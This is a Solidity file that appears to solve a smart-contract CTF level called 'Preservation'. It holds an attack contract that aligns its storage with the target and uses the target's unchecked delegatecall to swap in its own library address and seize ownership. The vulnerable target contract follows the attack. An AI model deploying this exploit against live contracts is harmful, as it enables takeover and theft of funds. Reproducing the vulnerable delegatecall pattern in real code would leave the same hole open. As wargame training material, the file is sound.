pragma solidity ^0.8;

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

contract Hack {
    // Align storage layout same as Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {
        // Now the library is my contract
        target.setFirstTime(uint256(uint160(address(this))));
        // call setFirstTime to execute code inside this contract and update owner state variable
        // To pass this challenge, new owner must be the player (msg.sender)
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "hack failed");
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}

//============================================

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}